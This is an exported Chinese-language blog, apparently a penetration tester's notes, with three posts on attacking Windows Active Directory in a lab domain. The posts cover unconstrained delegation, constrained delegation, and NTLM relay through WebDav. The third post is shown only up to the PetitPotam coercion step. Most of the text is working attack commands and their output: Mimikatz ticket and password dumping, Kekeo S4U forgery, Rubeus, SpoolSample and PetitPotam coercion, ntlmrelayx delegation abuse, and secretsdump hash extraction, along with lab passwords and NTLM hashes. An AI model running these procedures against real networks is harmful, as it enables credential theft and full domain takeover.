<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234917330.png" alt="image-20220108234917330"></p>
<h4 id="探测域内是否存在非约束委派"><a href="#探测域内是否存在非约束委派" class="headerlink" title="探测域内是否存在非约束委派"></a>探测域内是否存在非约束委派</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2019 10.0.10.110 dc vulntarget\win2019::Admin@666</span><br><span class="line">win2016 10.0.10.111 域内机器 vulntarget\win2016::Admin#123</span><br></pre></td></tr></table></figure>

<p>查找利用账户时，我们暂且不考虑机器账户，因为拿到域内机器账户的票据后，我们无法用于远程访问，因此，我们在进行非约束委派攻击时，首先考虑<strong>域用户</strong>，但这并不意味着<strong>机器账户</strong>没有任何用处，当我们可以对机器账户进行非约束委派攻击时，我们可以根据拿到的<strong>机器账户TGT票据</strong>进行DCsync拿到域内hash等操作。</p>
<p>利用adfind查找域内启用了非约束委派的机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235639960.png" alt="image-20220108235639960"></p>
<p>无需域用户账号密码查询非约束委派的域用户</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">AdFind.exe  -b <span class="string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>



<p>利用adfind查找域内启用了非约束委派的域内用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235703392.png" alt="image-20220108235703392"></p>
<p>无需密码查找域内非约束委派的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



<h4 id="机器账户的非约束委派攻击"><a href="#机器账户的非约束委派攻击" class="headerlink" title="机器账户的非约束委派攻击"></a>机器账户的非约束委派攻击</h4><p>首先在具备非约束委派攻击条件的域内机器执行Rubeus.exe监控登录操作，并实时转储TGT,（此操作需要本地管理员权限）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">1</span>  /filteruser:win2019$</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109000813844.png" alt="image-20220109000813844"></p>
<p>利用spoolsample项目使域控强制认证域机器抓取转储tgt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SpoolSample.exe win2019 win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109003544258.png" alt="image-20220109003544258"></p>
<p>很遗憾，此处由于dc已是win2019 ，强制认证已经得到微软的修复，因此此处转储机器账户TGT失败。</p>
<p><code>**低版本域控强制认证成功案例待补充**</code></p>
<p>但再Win2019 以下如win2012 win2008等服务器内 ，使用spoolSample项目强制域控机认证域机器是有很大概率奏效的。</p>
<h4 id="域用户的非约束委派攻击"><a href="#域用户的非约束委派攻击" class="headerlink" title="域用户的非约束委派攻击"></a>域用户的非约束委派攻击</h4><p>倘若发现存在非约束委派的用户，这时，我们可以在域内所有可以登陆此用户的域内机器上尝试非约束委派攻击，获取其缓存的服务账号票据，并期望获得域控的票据。</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225405402.png" alt="image-20220109225405402"></p>
<p>根据前文所用的adfind.exe ，我们可以发现，在win2016机器上，具有我们执行域用户的非约束委派攻击的条件</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225908898.png" alt="image-20220109225908898"></p>
<p>此处为了演示效果，我们主动让域控对域内机器win2016发起认证</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230059651.png" alt="image-20220109230059651"></p>
<p>此时，在win2016机器内已经存储下来了域管账户的tgt票据。</p>
<p>在win2016机器内利用mimikatz转储票据(以管理员权限启动)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230735844.png" alt="image-20220109230735844"></p>
<p>可以看到转储成功，已拿到域管用户的tgt票据，接下来利用ptt hash传递，获得域管权限。</p>
<p>PTT之前，我们是无法通过Kerberos认证访问域控机的共享目录的</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230941828.png" alt="image-20220109230941828"></p>
<p>利用mimikatz进行ptt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;2c7f64]-2-0-60a10000-Administrator@krbtgt-VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231126642.png" alt="image-20220109231126642"></p>
<p>此时已成功执行！</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231509139.png" alt="image-20220109231509139"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>约束委派攻击</title>
    <url>/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p>
<p><strong>流程:</strong></p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png" alt="    "></p>
<span id="more"></span>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.用户向Service1发送请求</span><br><span class="line"></span><br><span class="line">2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</span><br><span class="line"></span><br><span class="line">3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</span><br><span class="line"></span><br><span class="line">4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。</span><br><span class="line"></span><br><span class="line">注:这个过程其实Service1是获得了用户的ST1和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。</span><br><span class="line"></span><br><span class="line">5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。</span><br><span class="line"></span><br><span class="line">	A。Service1已经通过验证，并且有一个有效的TGT。</span><br><span class="line"></span><br><span class="line">	B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证</span><br><span class="line"></span><br><span class="line">6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。</span><br><span class="line"></span><br><span class="line">7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。</span><br><span class="line"></span><br><span class="line">8.service1代表用户使用ST2请求访问Service2</span><br><span class="line"></span><br><span class="line">9.Service2响应Service1的请求</span><br><span class="line"></span><br><span class="line">10.Service1将Service2的响应转发给User。</span><br></pre></td></tr></table></figure>

<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
<h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p>​    域控机为域用户配置SPN，用于域用户配置约束委派</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -U -A SQL/test win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205432579.png" alt="image-20220116205432579"></p>
<p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p>
<p>为win2016用户配置约束委派，做win2    019机器的cifs服务的委派</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205616253.png" alt="image-20220116205616253"></p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205819779.png" alt="image-20220116205819779"></p>
<p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p>
<h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p>
<h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210212550.png" alt="image-20220116210212550"></p>
<p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p>
<h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212912030.png" alt="image-20220116212912030"></p>
<p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p>
<h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /password:Admin#123</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210849880.png" alt="image-20220116210849880"></p>
<h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211127487.png" alt="image-20220116211127487"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211348121.png" alt="image-20220116211348121"></p>
<h6 id="利用kekeo进行S4U伪造"><a href="#利用kekeo进行S4U伪造" class="headerlink" title="利用kekeo进行S4U伪造"></a>利用kekeo进行S4U伪造</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211749435.png" alt="image-20220116211749435"></p>
<h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211914613.png" alt="image-20220116211914613"></p>
<p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p>
<p>查看域控机的共享目录成功！</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212122245.png" alt="image-20220116212122245"></p>
<h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>注:需要管理员权限才可拿到密码Hash</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213302798.png" alt="image-20220116213302798"></p>
<h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:win2016$ /domain:vulntarget.com /NTLM:e0cd419213811fd910ca6c3c42d764e7</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213633756.png" alt="image-20220116213633756"></p>
<p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p>
<h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_win2016$@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214205656.png" alt="image-20220116214205656"></p>
<h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214345566.png" alt="image-20220116214345566"></p>
<p>尝试对域控进行共享目录访问,利用成功！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\win2019.vulntarget.com\c$</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214439465.png" alt="image-20220116214439465"></p>
<p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p>
<h4 id="域外利用"><a href="#域外利用" class="headerlink" title="域外利用"></a>域外利用</h4><h5 id="域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令"><a href="#域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令" class="headerlink" title="域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:"></a>域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:</h5><h6 id="在域外探测存在约束委派的域用户账户"><a href="#在域外探测存在约束委派的域用户账户" class="headerlink" title="在域外探测存在约束委派的域用户账户:"></a>在域外探测存在约束委派的域用户账户:</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<h6 id="在域外探测存在约束委派的域主机"><a href="#在域外探测存在约束委派的域主机" class="headerlink" title="在域外探测存在约束委派的域主机:"></a>在域外探测存在约束委派的域主机:</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<h5 id="域外通过getST-py进行约束委派攻击"><a href="#域外通过getST-py进行约束委派攻击" class="headerlink" title="域外通过getST.py进行约束委派攻击"></a><strong>域外通过getST.py进行约束委派攻击</strong></h5><p>(可通过隧道，需提前通过hosts文件绑定ip与主机名)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019.vulntarget.com -impersonate administrator vulntarget/win2016$ -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>

<p>-hashes:  NTLM hash</p>
<p>-spn: 约束委派指定的服务</p>
<p>-impersonate 伪造的用户 存在约束委派的域主机名</p>
<p>-dc-ip: dc地址</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116221830895.png" alt="image-20220116221830895"></p>
<p>拿到administrator.ccache</p>
<p>利用export加载环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>

<p>注: KPB5CCNAME 变量名不可变</p>
<h6 id="利用secretsdump-py-拖取hash"><a href="#利用secretsdump-py-拖取hash" class="headerlink" title="利用secretsdump.py 拖取hash"></a>利用secretsdump.py 拖取hash</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -k -no-pass win2019.vulntarget.com -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116224843756.png" alt="image-20220116224843756"></p>
<p>注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>摸了……..</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>通过WebDav进行NTLM Relay</title>
    <url>/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/</url>
    <content><![CDATA[<h3 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h3><p>​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap/s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？</p>
<p>​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端不支持签名验证的话，服务端在与客户端通信时是不会强制要求签名认证的。因此我们可以使用HTTP服务中的WebDav来尝试Relay攻击了。</p>
<span id="more"></span>

<h3 id="0x2-什么是WebDav"><a href="#0x2-什么是WebDav" class="headerlink" title="0x2 什么是WebDav"></a>0x2 什么是WebDav</h3><p>​    WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV  就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。</p>
<p>​    Windows通过WebClient服务实现WebDav，允许Windows程序通过WebDav来创建、读取以及写入服务器上的文件，并通过HTTP服务进行通信，在客户端访问WebDav时，若开启Windows身份验证机制，我们便可以通过域内凭证进行访问服务。</p>
<h3 id="0x3-攻击步骤"><a href="#0x3-攻击步骤" class="headerlink" title="0x3 攻击步骤"></a>0x3 攻击步骤</h3><ul>
<li>拿到一枚域用户</li>
<li>探测开启WebDav的服务器</li>
<li>在域内为攻击机添加DNS解析</li>
<li>使用Responder进行中继与委派</li>
<li>强制WebDav服务器认证攻击机</li>
<li>执行基于资源的约束委派攻击</li>
</ul>
<h3 id="0x4-攻击流程"><a href="#0x4-攻击流程" class="headerlink" title="0x4 攻击流程"></a>0x4 攻击流程</h3><h4 id="0x01-探测WebDav服务"><a href="#0x01-探测WebDav服务" class="headerlink" title="0x01 探测WebDav服务"></a>0x01 探测WebDav服务</h4><p>​    拿到域内权限后，通过<code>GetWebDAVStatus.exe</code>探测内网中开放WebDav的服务器。</p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png" alt="image-20221030124101717"></p>
<p>​    发现目标后，为了让Relay顺利进行，我们可以添加一份DNS A记录，从而使得WebDav通过默认凭据来对我们进行身份验证，由于在Windows当中，WebDav由WebClient服务实现，而WebClient服务仅对内网以及受信任站点中的目标来采用默认凭据进行身份验证。</p>
<h4 id="0x02-添加DNS解析"><a href="#0x02-添加DNS解析" class="headerlink" title="0x02 添加DNS解析"></a>0x02 添加DNS解析</h4><h5 id="0x1-域内使用PowerMad添加"><a href="#0x1-域内使用PowerMad添加" class="headerlink" title="0x1.域内使用PowerMad添加"></a>0x1.域内使用PowerMad添加</h5><p>此处我们使用PowerMad进行添加DNS A解析记录，此处我们添加解析记录，普通域用户也可添加，并非只有域管用户才可操作。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\<span class="built_in">invoke-DNSupdate</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-DNSUpdate</span> <span class="literal">-DNSType</span> A <span class="literal">-DNSName</span> evil.pentest.local <span class="literal">-DNSData</span> <span class="number">10.0</span>.<span class="number">10.128</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png" alt="image-20221030124859446"></p>
<p>紧接着使用<code>ipconfig /flushdns</code>刷新dns本地缓存后可以看到使用ping命令即可成功解析我们所添加的记录</p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030125010956.png" alt="image-20221030125010956"></p>
<h5 id="0x2-域外使用dnstool-py添加"><a href="#0x2-域外使用dnstool-py添加" class="headerlink" title="0x2.域外使用dnstool.py添加"></a>0x2.域外使用dnstool.py添加</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dnstool.py -u pentest.local\\Sharp -p Admin<span class="comment">#123 -r evil.pentest.local -d 10.0.10.128 --action add ws01.pentest.local</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151117006.png" alt="image-20221030151117006"></p>
<h4 id="0x03-准备NTLM-Relay"><a href="#0x03-准备NTLM-Relay" class="headerlink" title="0x03 准备NTLM Relay"></a>0x03 准备NTLM Relay</h4><p>回到攻击机进行操作。</p>
<p>利用Impacket项目<code>ntlmrelayx.py</code>执行攻击，指定LDAP协议进行身份验证，目标主机设置为域控，利用-delegate-access选项执行基于资源的约束委派攻击。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldaps://ws01 --delegate-access -smb2support</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030130628768.png" alt="image-20221030130628768"></p>
<h4 id="0x04-强制认证主机创建机器账户"><a href="#0x04-强制认证主机创建机器账户" class="headerlink" title="0x04 强制认证主机创建机器账户"></a>0x04 强制认证主机创建机器账户</h4><p>回到被我们控制的主机，使用PetitPotam 强制WebDav服务器认证我们的攻击机，此处不可使用ip进行强制认证，使用我们先前添加的DNS解析进行强制认证,此处的<code>@</code>符号前为主机名，后为端口号。</p>
<h5 id="0x1-域内认证"><a href="#0x1-域内认证" class="headerlink" title="0x1.域内认证"></a>0x1.域内认证</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PetitPotam.exe evil@<span class="number">80</span>/evil.cnf <span class="number">10.0</span>.<span class="number">10.110</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030131357379.png" alt="image-20221030131357379"></p>
